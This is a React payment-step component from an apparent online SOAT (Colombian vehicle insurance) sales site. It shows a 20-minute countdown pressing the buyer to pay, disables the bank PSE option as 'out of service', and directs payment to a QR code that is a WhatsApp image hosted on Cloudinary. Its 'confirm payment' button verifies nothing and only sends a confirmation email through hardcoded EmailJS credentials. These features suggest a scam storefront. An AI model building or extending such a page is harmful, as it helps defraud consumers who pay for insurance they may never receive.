import React, { useState, useEffect } from "react";
import "../styles/StepThree.css";
import emailjs from 'emailjs-com';
import Swal from 'sweetalert2';


const StepThree = ({ activeStep, placa, soat, setActiveStep }) => {
  const [metodoPago, setMetodoPago] = useState("bancolombia");
  const [tiempoRestante, setTiempoRestante] = useState(20 * 60); // 20 minutos en segundos

  useEffect(() => {
    if (activeStep !== 3) return; // Solo inicia el contador si step es 3
    if (tiempoRestante <= 0) return; // Si el tiempo llega a 0, detenemos el contador

    const timer = setInterval(() => {
      setTiempoRestante((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer); // Limpiar el intervalo cuando se desmonta
  }, [activeStep, tiempoRestante]);

  // Función para formatear el tiempo en mm:ss
  const formatearTiempo = (segundos) => {
    const minutos = Math.floor(segundos / 60);
    const segundosRestantes = segundos % 60;
    return `${minutos}:${segundosRestantes < 10 ? "0" : ""}${segundosRestantes}`;
  };

  const enviarCorreoSoat = () => {

    
    const templateParams = {
      name: placa.nombre,
      email: placa.correo,
      value: soat.toLocaleString('es-CO', { style: 'currency', currency: 'COP' }),
    };
  
    emailjs.send(
      'service_lranpqg',
      'template_sht1s3s',
      templateParams,
      'dWA53Qi0rBCM4XYmV'
    )
    .then((response) => {
      console.log('Correo enviado correctamente', response.status, response.text);
  
      // Mostrar el popup
      Swal.fire({
        title: 'Correo enviado',
        text: `Hemos enviado un correo a ${placa.correo}`,
        icon: 'success',
        confirmButtonText: 'OK',
        timer: 2000,
        showConfirmButton: false,
        timerProgressBar: true,
      });
  
      // Esperar 1 segundo antes de cambiar de paso
      setTimeout(() => {
        setActiveStep(1);
      }, 1000);
    })
    .catch((error) => {
      console.error('Error al enviar el correo', error);
      Swal.fire({
        title: 'Error',
        text: 'Hubo un problema al enviar el correo. Inténtalo de nuevo.',
        icon: 'error',
      });
    });
  };

  return (
    <div className="step-three-container">
      {/* Sección de Regresar y Temporizador */}
      <div className="header">
        <button className="btn-regresar"> </button>
        <div className="timer">
          🛈 Recuerda que tienes <strong>{formatearTiempo(tiempoRestante)}</strong> minutos para realizar tu pago.
        </div>
      </div>

      {/* Sección de Métodos de Pago */}
      <div className="payment-container">
        <div className="payment-header">PSE y otros medios de pago</div>

        <div className="payment-options">
          <label className={`payment-option ${metodoPago === "pse" ? "disabled" : ""}`}>
            <input type="radio" name="pago" value="pse" disabled />
            <span className="icon">🚫</span>
            Tarjeta débito PSE (Fuera de servicio)
          </label>

          {/* <label className={`payment-option ${metodoPago === "bancolombia" ? "selected" : ""}`}>
            <input
              type="radio"
              name="pago"
              value="bancolombia"
              checked={metodoPago === "bancolombia"}
              onChange={() => setMetodoPago("bancolombia")}
            />
            <span className="icon">🏦</span>
            Cuenta de ahorros y corriente (Bancolombia)
          </label> */}

          <label className={`payment-option ${metodoPago === "nequi" ? "selected" : ""}`}>
            <input
              type="radio"
              name="pago"
              value="nequi"
              checked={metodoPago === "nequi"}
              onChange={() => setMetodoPago("nequi")}
            />
            <span className="icon">📱</span>
            Pagar con QR
          </label>
        </div>

        {/* Si el usuario selecciona Nequi, se muestra el QR */}
        {metodoPago === "nequi" && (
          <div className="qr-container">
            <p>Escanea el código qr para pagar:</p>
            <img src="https://res.cloudinary.com/ds9spphmu/image/upload/v1744738471/Imagen_de_WhatsApp_2025-04-12_a_las_16.39.27_12ef6b72_ezlnyb.jpg" alt="QR para pagar con Nequi" className="qr-image" />
          </div>
        )}

        <div className="total">
          <strong>TOTAL A PAGAR:</strong> <span className="precio">{soat.toLocaleString('es-CO', { style: 'currency', currency: 'COP' })}</span>
        </div>
        {metodoPago === "nequi" && (
          <><p>Después de realizar el pago mediante el código QR, por favor haz clic en "Confirmar pago". A continuación, recibirás un correo electrónico con la confirmación y la información correspondiente. </p><button className="btn-pagar" disabled={tiempoRestante <= 0} onClick={enviarCorreoSoat}>
            {tiempoRestante > 0 ? "Cofirmar pago" : "TIEMPO EXPIRADO"}
          </button></>
        )}

      </div>

      {/* Sección de Resumen */}
      <div className="resumen-container">
        <h3>Resumen:</h3>
        <p><strong>Clase:</strong> {placa.claseVehiculo}</p>
        <p><strong>Modelo:</strong> {placa.modelo}</p>
        <p><strong>Cilindraje:</strong> {placa.claseVehiculo}</p>
        <p><strong>Placa:</strong> {placa.placa}</p>
        <p><strong>Descuentos:</strong> $0.00</p>
        <p><strong>Ciudad de Circulacion: </strong> {placa.ciudadCirculacion}</p>
        <p><strong>Valor Total:</strong> <span className="precio">{soat.toLocaleString('es-CO', { style: 'currency', currency: 'COP' })}</span></p>
      </div>
    </div>
  );
};

export default StepThree;
